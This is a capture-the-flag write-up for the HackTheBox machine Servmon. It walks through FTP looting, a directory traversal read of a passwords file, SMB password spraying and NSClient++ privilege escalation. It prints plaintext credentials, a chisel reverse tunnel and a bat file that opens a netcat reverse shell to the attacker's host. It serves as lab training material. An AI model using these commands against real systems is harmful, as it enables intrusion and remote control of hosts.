# Servmon- HackTheBox WriteUp
![info_card](/images/servmon/info_card.png)
## Enumeration & Information Gathering 

#### Scanning

```
21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR          Users
| ftp-syst: 
|_  SYST: Windows_NT

[redacted]

22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
ssh-hostkey: 


[redacted]

80/tcp   open  http          syn-ack ttl 127
[redacted]

135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
[redacted]

139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
[redacted]

445/tcp  open  microsoft-ds? syn-ack ttl 127
[redacted]

5666/tcp open  tcpwrapped    syn-ack ttl 127
[redacted]

6699/tcp open  tcpwrapped    syn-ack ttl 127
[redacted]

8443/tcp open  ssl/https-alt syn-ack ttl 127
commonName=localhost
| Issuer: commonName=localhost

#### Service Enumeration 
**FTP:**
Pillaging FTP
![pillage_ftp](/images/servmon/pillage_ftp.png)

Checking the results of files copied:

![stolen_ftp](/images/servmon/stolen_ftp.png)

NVMS - Monitoring System
NSClient - Client for managing monitoring hosts like nagios
```

**WEB:**

Navigating to the home page on port 80

![nvms_home](/images/servmon/nvms_home.png)

**SSL (8443)**

Navigating to the home page on port 8443

![nsclient_home](/images/servmon/nsclient_home.png)


## Exploitation 
The notes mentioned NVMS which appears to be whats running on port 80 and Nsclient on 8443.

So we google search for both and also check for possible exploits which leads to the **NVMS 1000 - Directory Traversal**
https://www.exploit-db.com/exploits/47774

Testing the exploit:

![dir_trav_eg](/images/servmon/dir_trav_eg.png)

Since that works, let's use the directory traversal vulnerability to read Passwords.txt from Nathan's Desktop.

![dir_trav_pass](/images/servmon/dir_trav_pass.png)

#### Foothold
After finding the passwords on Nathan's Desktop we try them on the NSClient authentication page and they all fail.

![pwds_failed_nsclient](/images/servmon/pwds_failed_nsclient.png)

Going back and carefully reading the "Notes to do" 
 
Trying to read some of the config files for NSClient using the Directory traversal vulnerabilit returns a 404 error

Thinking more about it an reading the notes again. These passwords do get re-uploaded to the secure folder. These passwords definetly have to be reused somewhere, otherwise why would they need to be storing and possibly sharing them.

So it is worth testing this passwords everywhere possible

With a simple one liner for loop the passwords cant be tested with smbclient.

![brute_nathan](/images/servmon/brute_nathan.png)

It fails for user nathan, however, successful for user nadine with the password  **L1k3B1gBut7s@W0rk**

![brute_nadine](/images/servmon/brute_nadine.png)

The password can now be tried on SSH

![ssh_nadine](/images/servmon/ssh_nadine.png)

#### Post Exploitation Enumeration 

Searching google for exploits, there is a privillede escalation exploit for NSClient++ 

https://www.exploit-db.com/exploits/46802

Trying it out.
The password can be grabbed from the ini file as mention in the exploit. 

It is also noticed that the server only allows access from localhost

```
nadine@SERVMON c:\Program Files\NSClient++type nsclient.ini
╗┐# If you want to fill this file with all available options run the following command
; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = **127.0.0.1**

; in flight - TODO
[/settings/NRPE/server]


; in flight - TODO
[/modules]

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

[--snip--]

Scheduler = enabled

CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any comman
d line here and they will be expanded by scripts placed under the wrapped scripts secti
on. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any gi
ven arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) script
s
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Scri
pt `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | 
powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts m
odule. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]

; Undocumented key
foobar = c:\Temp\evil.bat

; Undocumented key
evil = c:\Temp\evil.bat


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; foobar - To configure this create a section under: /settings/scheduler/schedules/foob
ar
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExt
ernalScripts).
[/settings/external scripts]
allow arguments = true
```

We need to do a remote port forward of port 8443


## Privilege Escalation 

We try SSH port forwarding but fail (have to recheck why this failed - syntaxt issue maybe)

I've seen port forwarding done quite easily on windows using chisel in a few ippsec videos so we try that.

Downloading chisel linux and windows releases from the github page: https://github.com/jpillora/chisel/releases

Get the chisel executable over to the windows host

> nadine@SERVMON C:\Users\Nadine>copy \\10.10.14.21\share\chisel.exe c:\windows\temp\chisel.exe
        1 file(s) copied.


On localhost: 
>./chisel server --host 10.10.14.21 -port 8888 --reverse

On the remote server:
>nadine@SERVMON c:\Windows\Temp>.\chisel.exe client 10.
10.14.21:8888 R:8443:127.0.0.1:8443

Now navigate to https://localhost:8443 
When prompted for the password, enter the password found in the nsclient.ini file

And we are able to login.

![nsclient_authed](/images/servmon/nsclient_authed.png) 

Following the exploit. 

The bat script can be created with

> @echo off
> c:\temp\nc64.exe 10.10.14.21 443 -e cmd.exe

Copy nc64.exe and evil.bat to c:\temp

Following the steps on the Poc,the script and the scheduler is created

![script_added](/images/servmon/add_script.png)

Restarting the machine is not ideal in this situation, however, there may be a way to restart the service.

The modules page has the running services listed. Trying to disable and re-enable a service that can trigger our script.

Making an educated guess that the CheckExternalScripts  module is will trigger the script if restarted, it will be the first one to try

Once toggling it OFF and ON,a shell is received !

![restart](/images/servmon/restart.png) 

And finally the root flag can be read

![root](/images/servmon/root.png) 

Conclusion: 

There was a lot to learn from this box, with the only caveat being that the NSClient Webserver was extremely unstable making the privilledge escalation step very tideous.

LateComerz out!

<img src="https://www.hackthebox.eu/badge/image/206328" alt="Hack The Box">
